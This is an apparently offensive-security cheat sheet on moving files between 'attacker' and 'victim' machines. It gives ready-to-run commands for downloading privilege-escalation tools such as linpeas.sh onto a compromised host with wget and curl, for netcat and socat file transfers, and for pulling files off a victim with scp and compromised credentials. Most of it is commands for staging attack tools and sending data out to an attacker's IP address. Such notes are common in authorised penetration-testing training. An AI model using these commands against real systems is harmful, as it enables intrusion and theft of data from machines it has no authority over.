## ⬇️ DOWNLOAD FROM ATTACKER TO VICTIM

### Method I — HTTP Server

**Host on Attacker Machine:**
```bash
sudo python3 -m http.server 80
sudo python -m SimpleHTTPServer 80       # Python 2
```

**Download on Victim Machine:**
```bash
wget http://192.168.100.10/linpeas.sh -O linpeas.sh
curl http://192.168.100.10/linpeas.sh -o linpeas.sh
```
### Method II — Netcat

```bash
# Send file (attacker → victim)
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
cat something.zip | nc 10.11.0.22 4444
nc -lp 444 < exploit.c

# Receive file
nc -nlvp 4444 > incoming.exe
```
### Method III — Socat

```bash
# Send file (listener)
socat TCP4-LISTEN:443,fork file:file.txt

# Receive file (connect)
socat TCP4:192.168.100.10:443 file:file.txt,create
```
## ⬆️ DOWNLOAD FROM VICTIM TO ATTACKER

### Method I — SCP

> ⚠️ Requires compromised credentials on victim machine

```bash
# From attacker machine (pull single file)
sudo scp -r username@<victim-ip>:/home/user/file.txt ./

# From attacker machine (pull folder)
sudo scp -r username@<victim-ip>:/home/user/folder ./

# Between two remote hosts
sudo scp user1@host1.com:/files/test.txt user2@host2.com:/files
```
### Method II — Netcat

```bash
# Receive file (attacker — listen first)
nc -nlvp 4444 > incoming.exe

# Send file (victim — connect and send)
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
cat something.zip | nc 10.11.0.22 4444
nc -lp 444 < exploit.c
```
## 🔑 Quick Reference

| Method   | Direction         | Requires              | Notes                        |
|----------|-------------------|-----------------------|------------------------------|
| HTTP     | Attacker → Victim | Python on attacker    | Simple, no encryption        |
| Netcat   | Both              | `nc` on both ends     | Fast, no encryption          |
| Socat    | Both              | `socat` on both ends  | More stable than nc          |
| SCP      | Victim → Attacker | SSH creds on victim   | Encrypted, uses SSH          |
